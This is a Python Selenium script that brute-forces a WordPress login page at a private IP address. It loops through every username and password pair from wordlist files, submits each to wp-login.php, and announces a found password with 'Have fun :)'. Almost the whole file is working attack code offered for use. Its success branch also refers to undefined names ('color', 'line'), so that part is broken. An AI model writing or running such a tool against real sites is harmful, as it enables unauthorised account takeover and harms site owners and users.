import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
browser = webdriver.Chrome(executable_path="S:/_Programming/Hatch/Hatch-python3-optimised/chromedriver.exe",chrome_options=optionss)
wait = WebDriverWait(browser, 100)
url = "http://172.42.100.58/wp-login.php"

while True:
    try:
        with open("userlist.txt", 'r') as users:
            for username in users:
                with open("passlist.txt", 'r') as passwd:
                    for password in passwd:
                        browser.get(url)
                        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "#wp-submit")))
                        username_input = browser.find_element_by_id("user_login") 
                        password_input = browser.find_element_by_id("user_pass") 

                        username_input.send_keys(username.rstrip())
                        password_input.send_keys(password.rstrip())

                        submitButton = browser.find_element_by_id("wp-submit") 
                        submitButton.click()
                        
                        print ('Tried password: '+ password.rstrip() + ' for user: ' + username.rstrip())
    except KeyboardInterrupt: #returns to main menu if ctrl C is used
        print('CTRL C')
        break
    except selenium.common.exceptions.NoSuchElementException:
        print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
        print ('LAST PASS ATTEMPT BELLOW')
        print (color.GREEN + 'Password has been found: {0}'.format(line))
        print (color.YELLOW + 'Have fun :)')
        exit()